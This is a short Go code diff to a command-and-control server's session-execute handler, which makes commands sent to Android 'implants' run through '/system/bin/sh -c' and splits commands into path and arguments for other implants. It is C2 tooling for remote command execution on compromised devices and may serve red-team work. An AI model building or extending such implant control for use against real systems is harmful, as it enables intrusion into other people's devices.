@@ -231,19 +231,29 @@ func handleSessionExecute(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	args := strings.Fields(req.Command)
-	if len(args) == 0 {
-		jsonError(w, "empty command", http.StatusBadRequest)
-		return
-	}
+	var execReq *sudosocpb.ExecuteReq
 
-	execReq := &sudosocpb.ExecuteReq{
-		Path:   args[0],
-		Args:   args[1:],
-		Output: true,
-		Request: &commonpb.Request{
-			SessionID: sessionID,
-		},
+	// Android implants run in a restricted process without PATH. Wrap every
+	// command in /system/bin/sh -c so binaries are found via the shell.
+	if strings.Contains(strings.ToLower(session.OS), "android") {
+		execReq = &sudosocpb.ExecuteReq{
+			Path:   "/system/bin/sh",
+			Args:   []string{"-c", req.Command},
+			Output: true,
+			Request: &commonpb.Request{SessionID: sessionID},
+		}
+	} else {
+		args := strings.Fields(req.Command)
+		if len(args) == 0 {
+			jsonError(w, "empty command", http.StatusBadRequest)
+			return
+		}
+		execReq = &sudosocpb.ExecuteReq{
+			Path:   args[0],
+			Args:   args[1:],
+			Output: true,
+			Request: &commonpb.Request{SessionID: sessionID},
+		}
 	}
 
 	resp := &sudosocpb.Execute{Response: &commonpb.Response{}}
